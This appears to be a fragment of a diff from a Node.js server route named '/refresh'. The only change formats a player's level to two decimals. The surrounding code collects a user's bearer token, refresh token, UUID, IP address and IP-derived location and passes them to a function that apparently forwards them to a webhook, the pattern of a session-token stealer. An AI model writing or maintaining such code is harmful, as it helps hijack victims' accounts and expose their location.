@@ -269,7 +269,7 @@ app.get('/refresh', async (req, res) => {
         const security = ipLocationArray[3]
         const playerData = await getPlayerData(username)
         const rank = playerData[0]
-        const level = playerData[1].toFixed()
+	const level = playerData[1].toFixed(2);
         refreshToWebhook(formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, city, flag, security)
     } catch (e) {
         console.log(e)
